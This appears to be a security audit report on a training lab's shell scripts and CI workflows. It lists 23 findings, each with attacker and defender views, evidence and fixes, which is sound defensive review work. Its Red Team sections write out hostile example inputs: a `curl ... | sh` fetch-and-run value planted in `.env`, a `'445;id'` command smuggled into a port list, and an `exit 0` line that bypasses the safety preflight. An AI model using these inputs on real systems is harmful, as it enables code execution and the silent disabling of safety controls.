# Findings — scripts/ and .github/workflows/ (2026-08-13)

**Scope:** `scripts/safety/egress_test.sh`, `scripts/lab/{start,reset,student-env}.sh`, `scripts/setup/{compile_sigma,setup_project_board,teardown_project_board}.sh`, `.github/workflows/{validate,integration}.yml`, `.github/dependabot.yml`. Supporting files read for context (partially out of scope, flagged where cited): `docker-compose.yml`, `.env.example`, `.gitignore`, `.pre-commit-config.yaml`, `tests/test_start_script.py`, `tests/test_reset_script.py`.

**Assumption:** the lab is used on shared, student-accessible hosts, and `.env` is student-writable. If every operator is a trusted instructor on a dedicated host, F2/F9/F10 drop one severity band.

## Summary

- **23 findings: 1 CRITICAL, 3 HIGH, 12 MEDIUM, 6 LOW** (+1 INFO block of verified-clean checks).
- **`egress_test.sh`'s guarantees are not solid.** It fails open on every error path: any resolver failure, timeout, SERVFAIL, or typo'd domain is indistinguishable from a genuine air-gap and yields a PASS, and there is no positive control probe proving the resolver even works. It also only checks an operator-supplied domain allowlist — it never tests general internet egress, and never validates the control it claims to complement (`lab-net: internal: true`).
- Second-order: the preflight `source`s `.env` (`egress_test.sh:61`), so a `.env` containing `exit 0` silently bypasses the entire guardrail and any shell metacharacter in `.env` executes as the operator.
- The guardrail has **zero test coverage** — `tests/test_start_script.py:95` and `tests/test_reset_script.py:98` both replace it with an always-exit-0 stub, and `.github/workflows/integration.yml:68` sets `AIB_SKIP_PREFLIGHT=1`, so it is never executed anywhere in CI.
- CI is clean on the classic vectors (no `pull_request_target`, no `secrets.*`, no `github.event.*` in `run:`), but **neither workflow declares `permissions:`**, so fork PRs get default-scoped `GITHUB_TOKEN` while executing PR-controlled `.pre-commit-config.yaml`, `requirements.txt`, and Dockerfiles.

---

**[CRITICAL] F1 — Air-gap preflight fails open on every resolver error and has no positive control**
- **MITRE ATT&CK**: T1562.001 (Impair Defenses: Disable or Modify Tools); T1090 context
- **Red Team**: The verdict logic treats "resolver returned nothing" as proof of air-gap. `resolve_host()` swallows all errors (`2>/dev/null` on every branch) and `getent`'s pipeline exit status is `awk`'s, which is always 0 — so a DNS timeout, SERVFAIL, blackholed resolver, captive portal, a `resolv.conf` pointed at `127.0.0.1`, or a single typo in `SAFE_MODE_DOMAINS` (`uiwtx.ed`) all produce `[ok] <domain> does not resolve` and `exit 0`. A student who wants the lab to start simply breaks name resolution for 5 seconds. Nothing in the script ever proves it is capable of resolving anything, so a PASS carries no evidence.
- **Blue Team**: Missing control — a canary/control probe. The script should resolve a domain that MUST resolve when the host has connectivity and hard-fail (exit 2) if that control lookup also fails, converting "resolver broken" from PASS into ERROR. Also missing: any assertion of actual egress (e.g., TCP 443 to a fixed public IP) and any check that `lab-net`/`quarantine-net` still carry `internal: true` — the control this script claims to complement (`egress_test.sh:7-8`) is never verified. `docs/THREAT_MODEL.md:117` names exactly this failure mode ("`internal: true` got commented out") and no automated check covers it.
- **Evidence**: `scripts/safety/egress_test.sh:100-114`
  ```bash
  getent)
      getent hosts "$domain" 2>/dev/null | awk 'NR==1{print $1}' ;;
  ```
  and `scripts/safety/egress_test.sh:136,147-149`
  ```bash
  if ip="$(resolve_host "$d")" && [[ -n "$ip" ]]; then
  ...
  else
      log "  [ok] $d does not resolve"
  ```
- **Recommendation**: Before the domain loop, resolve a hardcoded control name (e.g. `AIB_CONTROL_DOMAIN`, default a well-known public domain) and `exit 2` with `[ERROR] resolver non-functional — preflight cannot certify air-gap` if it fails. Separately add an egress assertion: `timeout 3 bash -c '>/dev/tcp/1.1.1.1/443'` succeeding on the host should be reported (not necessarily fatal), and add a `docker compose config` grep asserting `internal: true` on both networks before `docker compose up` in `start.sh`.

---

**[HIGH] F2 — Preflight `source`s `.env`: arbitrary code execution and total self-bypass**
- **MITRE ATT&CK**: T1059.004 (Unix Shell); T1562.001
- **Red Team**: `.env` is a docker-compose KEY=VALUE file that compose parses *without* a shell — but this script executes it. Two impacts. (1) Bypass: a `.env` line `exit 0` (or `SAFE_MODE_DOMAINS=x` followed by `exit 0`) terminates the sourced-in context with status 0, so `egress_test.sh` returns success, `start.sh:39` is satisfied, and the lab boots with the guardrail never having run. A student handed a "class .env" cannot tell. (2) RCE: `SAFE_MODE_DOMAINS=$(curl -s host/x | sh)` or backticks execute at source time as the operator, before any check runs. It also creates parser divergence — a `DB_PASS` containing `$`, backticks, or `#` means something different to bash than to compose.
- **Blue Team**: No integrity control on `.env` (no checksum, no signature, not covered by any test), no logging of what the preflight loaded. Detection opportunity: none currently — the script produces identical output on a bypassed run and a clean run. A one-line `grep -c` on the `.env` for non-`KEY=VALUE` lines would catch it.
- **Evidence**: `scripts/safety/egress_test.sh:58-63`
  ```bash
  if [[ -f .env ]]; then
      set -a
      # shellcheck disable=SC1091
      source .env
      set +a
  fi
  ```
- **Recommendation**: Replace `source` with a non-executing parser that reads only the two keys it needs, e.g. `SAFE_MODE_DOMAINS=$(sed -n 's/^SAFE_MODE_DOMAINS=//p' "$ENV_FILE" | tail -1 | tr -d '"'"'"'')`, and reject `.env` lines not matching `^[A-Za-z_][A-Za-z0-9_]*=` with a hard `exit 2`.

---

**[HIGH] F3 — The safety guardrail has zero functional test coverage; CI executes only a stub or skips it entirely**
- **MITRE ATT&CK**: N/A (assurance gap)
- **Red Team**: No test asserts that `egress_test.sh` fails when a domain resolves. Both shell-script test harnesses delete the real script and substitute one that always exits 0, and the only workflow that runs `start.sh` explicitly disables the preflight. A regression that makes the preflight always pass — including any of F1/F2 — ships with fully green CI. `tests/test_start_script.py:239-249` codifies the bypass as expected behavior.
- **Blue Team**: Missing control — a `tests/test_egress_test.py` unit harness with a stub resolver on `PATH` asserting: resolves → exit 1; `--strict` + empty domains → exit 1; no resolver tools → exit 2; resolver present but broken → should be exit 2 (currently 0, see F1).
- **Evidence**: `tests/test_start_script.py:51` (`safety/egress_test.sh -- stub (always exits 0)`), `tests/test_reset_script.py:93-98`, `.github/workflows/integration.yml:66-68`
  ```yaml
  # The runner is on the public internet -- the preflight would
  # refuse to start. Air-gap is enforced via lab-net internal:true
  echo "AIB_SKIP_PREFLIGHT=1" >> "$GITHUB_ENV"
  ```
- **Recommendation**: Add the unit harness above to `validate.yml`. Keep `AIB_SKIP_PREFLIGHT=1` in `integration.yml`, but add a step *before* it that runs `SAFE_MODE_DOMAINS=github.com bash scripts/safety/egress_test.sh --strict` and asserts exit code 1 — a positive proof on the one runner that is guaranteed to have internet.

---

**[HIGH] F4 — No `permissions:` block in either workflow; fork PRs execute PR-controlled code**
- **MITRE ATT&CK**: T1195.002 (Compromise Software Supply Chain); T1552.007
- **Red Team**: Neither workflow declares `permissions:`, so jobs inherit the repository default `GITHUB_TOKEN` scope. `validate.yml` triggers on `pull_request`, and three of its steps execute code the PR author controls: `pip install -r <PR's requirements.txt>` (arbitrary code via PEP 517 build backends), `docker compose build` on PR-authored Dockerfiles, and `pre-commit run --all-files` which executes hooks from the PR's own `.pre-commit-config.yaml` (a `repo: local` hook with any `entry:` runs immediately). If the repo default is "Read and write", a fork PR gets code execution holding a write-scoped token.
- **Blue Team**: Missing controls: workflow-level `permissions: contents: read`; "Require approval for all external contributors" on fork workflow runs. Detection: no runner egress monitoring (`step-security/harden-runner`) and no alerting on unexpected token use.
- **Evidence**: no match for `permissions:` anywhere under `.github/`. Vector at `.github/workflows/validate.yml:75-78`
  ```yaml
  if: matrix.python-version == '3.11'
  run: |
    pip install pre-commit
    pre-commit run --all-files --show-diff-on-failure
  ```
- **Recommendation**: Add `permissions: contents: read` at the top of both workflows (add `pull-requests: read` only if needed). Set repo Settings → Actions → Workflow permissions to read-only, and enable "Require approval for all outside collaborators".

---

**[MEDIUM] F5 — `bash -n` CI gate cannot fail: `find -exec ... \;` does not propagate exit status**
- **Red Team**: A shell script with a hard parse error — including `egress_test.sh` itself — passes this "syntax check". GNU `find` exits 0 unless `find` itself errored; a non-zero return from `-exec cmd \;` is not a find error. The only signal is a missing `[ok]` line in a 4-matrix-row log, which nothing greps. Combined with F13 (ShellCheck only scans `./scripts`), a broken `blue-team/response/actions/*.sh` IR playbook ships green.
- **Blue Team**: Missing control — a gate that actually returns non-zero. This one needs runtime confirmation; recommend the tester-debugger agent run `find . -name '*.sh' -exec bash -n {} \; ; echo $?` against a deliberately broken file.
- **Evidence**: `.github/workflows/validate.yml:111-113`
  ```yaml
  run: |
    find scripts blue-team pki-lab target-env -type f -name '*.sh' \
        -exec bash -n {} \; -exec echo "  [ok] {}" \;
  ```
- **Recommendation**: `find ... -print0 | xargs -0 -n1 bash -n` (xargs propagates), or change `\;` to `+` which GNU find *does* propagate, or wrap in an explicit loop with `|| exit 1`.

---

**[MEDIUM] F6 — Documented "AD port reachable" control can never fire independently**
- **Red Team**: `docs/THREAT_MODEL.md:127-128` presents two independent conditions ("refuses to start if any `SAFE_MODE_DOMAINS` resolves OR any `SAFE_MODE_AD_PORTS` is reachable"). In the implementation, ports are only probed *inside* the `if` branch where the domain already resolved — and any resolution alone already returns exit 1 at line 163-171. So `SAFE_MODE_AD_PORTS` never changes a verdict; it only decorates the error message. An operator who trims `SAFE_MODE_DOMAINS` believing the port check still backstops them has no backstop. Only the first A record is probed (`head -n1` / `NR==1` / `gethostbyname`), so multi-DC round-robin AD is partially probed too.
- **Blue Team**: Missing control — probing AD ports against the lab's own default-route gateway/subnet, which would detect "host is sitting on a corporate LAN" independent of DNS.
- **Evidence**: `scripts/safety/egress_test.sh:136-146` (port loop nested inside the resolve-success branch) vs `scripts/safety/egress_test.sh:163-171` (any resolution → exit 1).
- **Recommendation**: Either document that the port probe is diagnostic-only, or make it independent: probe `SAFE_MODE_AD_PORTS` against the host's default gateway and the /24 of the host's primary interface, independent of `SAFE_MODE_DOMAINS`.

---

**[MEDIUM] F7 — `start.sh` never `cd`s to the repo root; the preflight sources whatever `.env` is in the caller's cwd**
- **MITRE ATT&CK**: T1059.004
- **Red Team**: `reset.sh:31` does `cd "$ROOT_DIR"`; `start.sh` does not. `start.sh:24` reads `LAB_NET_PREFIX` from `${ROOT_DIR}/.env` with grep, but `egress_test.sh:58` reads `./.env` relative to cwd, and `docker compose` reads cwd too — three different `.env` resolutions. Chained with F2 this is a code-execution primitive: plant a `.env` in any directory; when an operator runs `/path/to/aib/scripts/lab/start.sh` from there, the contents are sourced and executed.
- **Blue Team**: No control. A single `cd "$ROOT_DIR"` plus passing an explicit `--env-file` path removes the whole class.
- **Evidence**: `scripts/lab/start.sh:17-25` computes `ROOT_DIR` but never `cd`s; `scripts/safety/egress_test.sh:58` `if [[ -f .env ]]; then`.
- **Recommendation**: Add `cd "$ROOT_DIR"` after line 17 in `start.sh`, and have `egress_test.sh` accept `AIB_ENV_FILE` (default `$(dirname $0)/../../.env`) instead of a bare relative `.env`.

---

**[MEDIUM] F8 — `start.sh`'s executable-bit check advertises the guardrail bypass in its error message**
- **MITRE ATT&CK**: T1562.001
- **Red Team**: `start.sh` requires the preflight be `-x`. On WSL2/Windows checkouts, zip downloads, or any `core.fileMode` mishap the bit is lost — and this repo demonstrably fights that (recent commits: `chore: preserve execute bits`, `chore: actually preserve execute bits`, `chore: restore execute bits (final)`; the working tree currently shows mode churn on 15 shell scripts). The error text then hands the student the kill switch. Predictable outcome: students run with the guardrail permanently off.
- **Blue Team**: Missing control — the failure mode should not have a documented one-liner escape. No telemetry distinguishes "chmod'd correctly" from "student took the shortcut".
- **Evidence**: `scripts/lab/start.sh:33-37`
  ```bash
  if [[ ! -x "$PREFLIGHT" ]]; then
      echo "[ERROR] preflight missing or not executable: $PREFLIGHT" >&2
      echo "        Run 'chmod +x $PREFLIGHT' or set AIB_SKIP_PREFLIGHT=1." >&2
  ```
- **Recommendation**: Test `[[ -f "$PREFLIGHT" ]]` and invoke `bash "$PREFLIGHT" --strict` (line 39), removing the exec-bit dependency entirely. Delete `or set AIB_SKIP_PREFLIGHT=1` from the error string. Add a `.gitattributes` with `*.sh text eol=lf` to stop the underlying churn.

---

**[MEDIUM] F9 — `AIB_SKIP_PREFLIGHT=1` bypass produces no durable, collectable telemetry**
- **MITRE ATT&CK**: T1562.001; T1070 (Indicator Removal)
- **Red Team**: The only trace of a bypassed safety check is one stderr line in an ephemeral terminal. In a scored classroom, a student can disable the air-gap guardrail and the instructor has no artifact to grade against. `docs/tutorials/instructor.md:188` shows the instructor manually curling a `lab_violation_penalty` with detail "set AIB_SKIP_PREFLIGHT=1 to bypass safe-mode" — confirming the penalty exists but is triggered by out-of-band human observation, not telemetry.
- **Blue Team**: Missing control — the bypass should write a timestamped record to `evidence/` (or better, POST to the scoreboard) so it survives the session and is visible to the instructor. Detection rule opportunity: a Sigma/ES rule on a `safety.preflight_bypassed` event; none exists.
- **Evidence**: `scripts/lab/start.sh:40-42`
  ```bash
  else
      echo "[start] AIB_SKIP_PREFLIGHT=1 — skipping air-gap preflight (NOT RECOMMENDED)" >&2
  fi
  ```
- **Recommendation**: In that `else` branch, append `$(date -Is) AIB_SKIP_PREFLIGHT=1 user=$(id -un) host=$(hostname)` to `evidence/safety-bypass.log` and, if the scoreboard is reachable, POST the event. Note this interacts with F14 — `reset.sh` wipes `evidence/`, so the record must live outside the wiped tree or be shipped immediately.

---

**[MEDIUM] F10 — `.env.*` is not gitignored; `student-env.sh` secrets are committable and world-readable**
- **MITRE ATT&CK**: T1552.001 (Credentials In Files)
- **Red Team**: `student-env.sh` generates three real secrets and the documented usage writes them to `.env.jdoe`. `.gitignore:151` ignores only `.env` — not `.env.*` — so `git add -A` commits `FLASK_SECRET_KEY`, `PLAYBOOK_AUTH_TOKEN`, and `SCOREBOARD_AUTH_TOKEN` in cleartext. `PLAYBOOK_AUTH_TOKEN` gates the IR playbook runner, whose container mounts `/var/run/docker.sock` (README.md:112) — that token is a path to host-level control. Separately, the stdout-redirect pattern inherits the caller's umask (typically 0644), so on a shared class host every student can read every other student's `.env.<id>`.
- **Blue Team**: Missing controls: `.env.*` gitignore entry; a secret-scanning pre-commit hook (`.pre-commit-config.yaml` has no `detect-secrets`/`gitleaks`); no GitHub push protection referenced anywhere.
- **Evidence**: `scripts/lab/student-env.sh:10-11` (`scripts/lab/student-env.sh jdoe > .env.jdoe`) and `:95-97`
  ```
  FLASK_SECRET_KEY="${FLASK_SECRET_KEY_VALUE}"
  PLAYBOOK_AUTH_TOKEN="${PLAYBOOK_AUTH_TOKEN_VALUE}"
  SCOREBOARD_AUTH_TOKEN="${SCOREBOARD_AUTH_TOKEN_VALUE}"
  ```
  vs `.gitignore:150-152` (`.env`, `.envrc`, `.venv` — no `.env.*`).
- **Recommendation**: Add `.env.*` / `!.env.example` to `.gitignore`; add a `gitleaks` or `detect-secrets` hook to `.pre-commit-config.yaml`; change `student-env.sh` to take an output path, create it with `umask 077`, and `chmod 600` it rather than relying on a shell redirect.

---

**[MEDIUM] F11 — Per-student ports/subnets are deterministic and bound to 0.0.0.0, enabling cross-student access**
- **MITRE ATT&CK**: T1046 (Network Service Discovery); T1213 (Data from Information Repositories)
- **Red Team**: `SLOT` is a pure function of the student id, so any student can compute any classmate's port block in one line (`printf 'alice' | sha256sum`). The compose port mappings (`"${SCOREBOARD_PORT:-5002}:5002"`, `"${KIBANA_PORT:-5601}:5601"`) bind all interfaces, and per prior findings ES/Kibana run with `xpack.security` disabled. Result on a shared class host: student A browses student B's Kibana and scoreboard, reads their alerts, and can grade-snoop or tamper. Per-student random tokens (a good control) protect the write endpoints but not unauthenticated Kibana. The documented slot collision (`student-env.sh:15-24`, ~13 students) additionally puts two students on the same /24 and the same host ports — a denial-of-service or accidental shared-network condition between stacks.
- **Blue Team**: Missing controls: loopback-only port binding; a stateful slot allocator that hard-fails on collision instead of documenting it; any Kibana auth.
- **Evidence**: `scripts/lab/student-env.sh:46-55`
  ```bash
  SLOT=$(( 0x$(printf '%s' "$STUDENT_ID" | sha256sum | cut -c1-4) % 128 ))
  PORT_BASE=$(( 10000 + SLOT * 10 ))
  ```
- **Recommendation**: Emit `BIND_ADDR=127.0.0.1` in the generated `.env` and change compose port mappings to `"${BIND_ADDR:-127.0.0.1}:${SCOREBOARD_PORT:-5002}:5002"`. Replace the hash slot with a file-locked allocator writing to `.aib-slots` that errors on an already-claimed slot instead of silently colliding.

---

**[MEDIUM] F12 — `compile_sigma.sh` swallows every Kibana import failure and exits 0; CI gate passes vacuously**
- **MITRE ATT&CK**: T1562.001 (defensive-tooling failure, blue-side)
- **Red Team**: Two silent-failure paths. (1) `REBASE=1` import: every `curl` failure is caught by `|| echo "[warn] ..."` and the script still prints `[compile] done.` and exits 0. An operator can push zero rules to Kibana and believe detections are live — the highest-impact blue-team failure mode there is. (2) If `blue-team/detection/sigma/` is empty, renamed, or rules move into subdirectories (the glob `"$SOURCE_DIR"/*.yml` is non-recursive), the script exits 0 with `[compile] no .yml rules`. The `validate.yml` "Smoke-test Sigma compile pipeline" step therefore passes green while shipping no detections at all.
- **Blue Team**: Missing controls: a post-import verification GET against `/api/detection_engine/rules/_find` asserting rule count; a CI assertion that `compiled/*.eql.json` count equals the source `.yml` count and is non-zero.
- **Evidence**: `scripts/setup/compile_sigma.sh:71-76`
  ```bash
  curl -fsS -X POST "$KIBANA_URL/api/detection_engine/rules" \
      ... >/dev/null || echo "  [warn] import failed for $(basename "$compiled") (may already exist)"
  ```
  and `:41-44` (`exit 0` on zero rules).
- **Recommendation**: Track a `failed=0` counter in the import loop and `exit 1` if non-zero (distinguish HTTP 409 "already exists" from real failures by capturing `-w '%{http_code}'`). Change the empty-rules path to `exit 1` when `AIB_REQUIRE_RULES=1`, and set that in CI. Use `shopt -s globstar; "$SOURCE_DIR"/**/*.yml` for recursion.

---

**[MEDIUM] F13 — ShellCheck coverage is narrower than the repo's own script inventory, and `severity: warning` suppresses the unquoted-variable class**
- **Red Team**: The CI ShellCheck step scans only `./scripts`, while the adjacent `bash -n` step (itself broken, F5) enumerates `scripts blue-team pki-lab target-env` — the author knows scripts live in all four. `blue-team/response/actions/{block_ip,isolate_host,restore_host}.sh` (IR playbooks that manipulate networking and are currently modified in the working tree) get no static analysis at all. Additionally `severity: warning` drops `info`- and `style`-level findings; SC2086 (unquoted variable, word-splitting/glob injection) is emitted at info level, which is precisely the class of bug behind F16.
- **Blue Team**: Missing control — full-repo ShellCheck at `info` severity. `.pre-commit-config.yaml:48` mirrors the same `--severity=warning` restriction, so local runs miss it too.
- **Evidence**: `.github/workflows/validate.yml:121-124`
  ```yaml
  uses: ludeeus/action-shellcheck@00cae500b08a931fb5698e11e79bfbd38e612a38 # v2.0.0
  with:
    scandir: ./scripts
    severity: warning
  ```
- **Recommendation**: Drop `scandir` (scan the repo) or list all four directories, and lower to `severity: info`. Mirror in `.pre-commit-config.yaml:48`. Note the SHA pin here is correct and should be the pattern for F17. Confirm the SC2086 severity level with a local run before flipping CI (tester-debugger).

---

**[MEDIUM] F14 — `reset.sh` destroys all forensic evidence and SIEM data with no audit record**
- **MITRE ATT&CK**: T1070.004 (Indicator Removal: File Deletion); T1485 (Data Destruction)
- **Red Team**: One command — `AIB_RESET_ASSUME_YES=1 scripts/lab/reset.sh` — wipes `evidence/*`, `reports/*`, and runs `docker compose down -v`, destroying the `es-data` volume and every alert in it. In a scored lab this is the anti-forensics button: a student who triggered a violation (or wants to erase a poor detection score) removes all grading substrate and leaves no record that a reset occurred, who ran it, or what was destroyed. The confirmation prompt is defeated by a single env var.
- **Blue Team**: Missing control — an append-only reset log outside the wiped trees, and/or shipping evidence to the scoreboard before deletion. Detection opportunity: an ES/Kibana alert on abrupt index emptiness, or a scoreboard-side record of expected-vs-present evidence artifacts. Neither exists.
- **Evidence**: `scripts/lab/reset.sh:88-104` (`docker compose down -v`, then `find evidence -mindepth 1 ... -exec rm -rf {} +`) and `:48-50`
  ```bash
  confirm_or_abort() {
      if [[ "${AIB_RESET_ASSUME_YES:-}" == "1" ]]; then
          return
  ```
- **Recommendation**: Before Step 2, append `$(date -Is) reset by=$(id -un) evidence_files=$(find evidence -type f | wc -l)` to `logs/lab-resets.log` (a path not wiped by Steps 3-4), and POST the same to the scoreboard when reachable. Optionally tar `evidence/` to `logs/evidence-<ts>.tar.gz` before the wipe.

---

**[MEDIUM] F15 — `teardown_project_board.sh` is destructive by default with no confirmation and a fuzzy issue selector**
- **MITRE ATT&CK**: T1485 (Data Destruction)
- **Red Team**: `DRY_RUN` defaults to `0`, there is no interactive prompt (unlike `reset.sh`), and the script immediately closes up to 500 issues, deletes every label in `user_stories.yml`, and deletes the Project v2 board. The issue selector is a GitHub *search* (`in:title "[US-"`), which is tokenized and fuzzy — and unlike `setup_project_board.sh:168`, teardown does **not** post-filter the results with an exact-title `select()`. A human-filed issue whose title fuzzily matches gets auto-closed. `REPO` is env-overridable, so a stray `REPO=` in the environment points the destruction at any repo the `gh` token can write.
- **Blue Team**: Missing control — a confirmation gate and an exact-match filter. Detection: GitHub audit log would show the bulk close, but nothing alerts on it.
- **Evidence**: `scripts/setup/teardown_project_board.sh:19` (`DRY_RUN="${DRY_RUN:-0}"`) and `:44-50`
  ```bash
  gh issue list --repo "$REPO" --state open --limit 500 \
      --search 'in:title "[US-"' --json number,title \
    | jq -r '.[] | "\(.number)\t\(.title)"' \
    | while IFS=$'\t' read -r n t; do
        run gh issue close "$n" --repo "$REPO" --reason "not planned"
  ```
- **Recommendation**: Default `DRY_RUN=1` and require `DRY_RUN=0` explicitly, or add a typed-confirmation prompt echoing `$REPO`. Post-filter with `jq 'select(.title | test("^\\[US-[0-9.]+\\](\\[task\\])? "))'` before closing. Add an explicit `--repo` guard that refuses to run unless `$REPO` matches the value in `git remote get-url origin`.

---

**[MEDIUM] F16 — Unparameterized `$title` interpolated into jq programs and GitHub search in `setup_project_board.sh`**
- **MITRE ATT&CK**: T1059.004 (template/argument injection)
- **Red Team**: `find_issue_by_title` builds the jq filter by string concatenation while the *same file* uses the correct `--arg` form 84 lines earlier. A story title in `user_stories.yml` containing a double quote or jq syntax either crashes the run or subverts the selector — e.g. a title yielding `select(.title=="" or true or "")` matches every issue, so `head -n 1` returns an unrelated issue, the script concludes the story "already exists", never creates it, and then calls `add_to_project` on the wrong issue URL. The `--search "in:title \"$title\""` on the preceding line has the same flaw. `ensure_status_options` likewise splices `$project_number` into the GraphQL document text rather than using a typed variable.
- **Blue Team**: Missing control — a schema/lint gate on `user_stories.yml` restricting title characters. None exists; the YAML is only checked for syntax by pre-commit `check-yaml`.
- **Evidence**: `scripts/setup/setup_project_board.sh:164-169`
  ```bash
  gh issue list --repo "$REPO" --state all --search "in:title \"$title\"" \
      --json number,title,url \
      --jq ".[] | select(.title==\"$title\") | {number,url}" | head -n 1
  ```
  Correct pattern for contrast at `:84`: `jq -r --arg t "$title" '.[] | select(.title==$t) | .number'`. GraphQL splice at `:131-133`: `projectV2(number:'"$project_number"')`.
- **Recommendation**: Change to `--jq` with a `$t` variable is not supported by `gh --jq`; instead pipe raw JSON to `jq --arg t "$title" '.[] | select(.title==$t)'`. For GraphQL, declare `query($login:String!,$number:Int!)` and pass `-F number="$project_number"`.

---

**[MEDIUM] F17 — First-party actions and pre-commit hooks pinned to mutable tags while CI executes their code**
- **MITRE ATT&CK**: T1195.002 (Compromise Software Supply Chain)
- **Red Team**: `actions/checkout` and `actions/setup-python` are pinned by major tag (`@v7`), which is a moving ref that the publisher (or anyone who compromises the publisher) can re-point at new code — this is the tag-mutability class behind supply-chain incidents involving other popular GitHub Actions. The repo already knows the right answer: `ludeeus/action-shellcheck` is correctly SHA-pinned with a `# v2.0.0` comment. `.pre-commit-config.yaml` pins `rev: v5.0.0` / `v0.6.9` tags, and `validate.yml:77` runs `pip install pre-commit` unpinned then executes those hook repos on every PR.
- **Blue Team**: Missing control — a CI lint (e.g. `zizmor`, `actionlint`, or a grep) rejecting `uses:` lines without a 40-hex SHA. Dependabot (`.github/dependabot.yml:52-61`) is configured for `github-actions` and does update SHA pins with a version comment, so SHA-pinning costs nothing in maintenance.
- **Evidence**: `.github/workflows/validate.yml:31` (`- uses: actions/checkout@v7`), `:34` (`uses: actions/setup-python@v7`), `.github/workflows/integration.yml:34,37`. Correct pattern at `validate.yml:121`.
- **Recommendation**: SHA-pin all four `uses:` entries with trailing `# vX.Y.Z` comments; pin `pre-commit==<version>` at `validate.yml:77` and `yamllint==<version>` at `:86`; move `.pre-commit-config.yaml` revs to full SHAs. Add an `actionlint`/`zizmor` step to enforce it. (I have not verified that `actions/checkout@v7` and `setup-python@v7` exist as published tags — if they do not, the workflow fails loudly, which is not a security issue but is worth confirming.)

---

**[MEDIUM] F18 — Lab CA material is generated by an untagged `alpine/openssl:latest` image**
- **MITRE ATT&CK**: T1195.002
- **Red Team**: The `pki-ca` service that bootstraps the lab certificate authority runs an image with no tag, resolving to `:latest` at every `start.sh` / `integration.yml` run — meaning the code that generates CA private keys changes silently and is never reproducible. The same compose file SHA-pins Suricata correctly, so the inconsistency is clearly unintentional. Marked MEDIUM rather than HIGH because `lab-net` is `internal: true` and the CA is a training CA. This file is adjacent to the requested scope but is executed directly by `scripts/lab/start.sh:45`.
- **Blue Team**: Missing control — no image-digest policy or `docker scout`/Trivy gate in CI.
- **Evidence**: `docker-compose.yml:503` and `docker-compose.yml:531`: `image: alpine/openssl` — contrast `docker-compose.yml:188`: `image: jasonish/suricata@sha256:47965a058991aefbcfcd3fc6daea875c08470258af640c09c41faa466ee0b6ce`.
- **Recommendation**: Pin both `alpine/openssl` references to a digest, and add a CI grep asserting every `image:` line contains `@sha256:` or an explicit version tag.

---

**[LOW] F19 — Unvalidated `--timeout` and port values flow into `timeout` and `bash -c`**
- **Red Team**: `--timeout` is accepted without a numeric check and passed to `timeout "$TIMEOUT"`; a non-numeric value makes `timeout` error out, `probe_port` returns non-zero, and every port is silently recorded as unreachable — i.e. `--timeout abc` disables port probing without any message. Separately, `$host` and `$port` are interpolated into a `bash -c` string; ports are only stripped of spaces (`p="${p// /}"`), so `SAFE_MODE_AD_PORTS='445;id'` set via the environment executes `id`. Low severity only because F2 already grants full execution via the same config file and F6 shows the port path is not verdict-bearing.
- **Blue Team**: Missing control — input validation at parse time.
- **Evidence**: `scripts/safety/egress_test.sh:43` (`TIMEOUT="${2:?--timeout needs a value}"`), `:117-120`
  ```bash
  probe_port() {
      local host="$1" port="$2"
      timeout "$TIMEOUT" bash -c ">/dev/tcp/${host}/${port}"
  ```
- **Recommendation**: Validate `[[ "$TIMEOUT" =~ ^[1-9][0-9]*$ ]] || exit 2`; inside the loop, `[[ "$p" =~ ^[0-9]{1,5}$ ]] || { err "invalid port"; exit 2; }` and `[[ "$ip" =~ ^[0-9a-fA-F.:]+$ ]]` before the probe.

---

**[LOW] F20 — No resolver timeout on the `getent` and `python3` paths**
- **Red Team**: `dig` gets `+time=2 +tries=1` and `host` gets `-W 2`, but `getent` (the first-choice resolver on Linux, so the common path) and the `python3` fallback have no timeout at all. On a blackholed resolver each domain can block for the libc default (up to ~40s with multiple nameservers), and the result is an empty string, which F1 turns into a PASS.
- **Blue Team**: No control; combine the fix with F1's control probe.
- **Evidence**: `scripts/safety/egress_test.sh:103-112` — `getent` and `python3` branches carry no timeout, unlike `:106,108`.
- **Recommendation**: Wrap both in `timeout 5`, and treat a `timeout`-induced exit 124 as a hard error (exit 2), not as "does not resolve".

---

**[LOW] F21 — `LAB_NET_PREFIX` validation accepts invalid octets and uses a fragile `.env` parse**
- **Red Team**: The regex accepts `999.999.999`, which passes validation and then fails obscurely inside docker/Suricata — the exact failure the check was added to prevent. The grep-based parse takes only the first `=`-delimited field (`LAB_NET_PREFIX=1.2.3=4` silently truncates), strips quote characters with `tr -d` (which removes *all* quote bytes anywhere, not just wrapping ones), and returns multiple lines if `.env` defines the key twice — that produces a newline-containing value that fails the regex (fail-closed, which is the correct direction).
- **Blue Team**: N/A. Robustness.
- **Evidence**: `scripts/lab/start.sh:24,27`
  ```bash
  PREFIX_TO_TEST=$(grep -E '^LAB_NET_PREFIX=' "${ROOT_DIR}/.env" | cut -d= -f2 | tr -d '""' | tr -d "''" || true)
  ...
  if ! [[ "$PREFIX_TO_TEST" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
  ```
- **Recommendation**: Use `^((25[0-5]|2[0-4][0-9]|1?[0-9]?[0-9])\.){2}(25[0-5]|2[0-4][0-9]|1?[0-9]?[0-9])$`, `tail -1` the grep, and `cut -d= -f2-`.

---

**[LOW] F22 — CI has no SAST or dependency-vulnerability gate**
- **Red Team**: `validate.yml` runs ruff, mypy, pre-commit, yamllint, ShellCheck, and unit tests — all correctness/style. Nothing checks for known-vulnerable dependencies (`pip-audit`, `safety`) or performs SAST (CodeQL). Dependency requirements are `==`-pinned (good for reproducibility) but pinned-and-vulnerable is the failure mode Dependabot only partially covers with weekly version bumps. There is no CodeQL workflow in `.github/workflows/`.
- **Blue Team**: Missing controls: `pip-audit` step; CodeQL default setup; GitHub secret-scanning push protection (not evidenced anywhere in the repo).
- **Evidence**: `.github/workflows/` contains only `validate.yml` and `integration.yml`; no `codeql`, `pip-audit`, `safety`, or `trivy` reference in either.
- **Recommendation**: Add a `pip-audit -r <each requirements.txt>` step (non-blocking first, then blocking) and enable CodeQL default setup for Python. For a security-training repo this doubles as curriculum material.

---

**[LOW] F23 — `integration.yml` enables the Docker-socket-mounted `ir` profile on the runner**
- **MITRE ATT&CK**: T1610 (Deploy Container) / container escape context
- **Red Team**: The workflow rewrites `.env` to `COMPOSE_PROFILES=ir,pki`, and the `blue-team` service in that profile mounts `/var/run/docker.sock` (README.md:112, "audit-2 Gap #1"). Anything achieving execution inside that container during the run controls the Docker daemon on the GitHub runner. Severity held at LOW because the workflow triggers only on `workflow_dispatch` and `schedule` from `main` — fork PRs cannot reach it. It would become HIGH if the trigger is ever widened to `pull_request`.
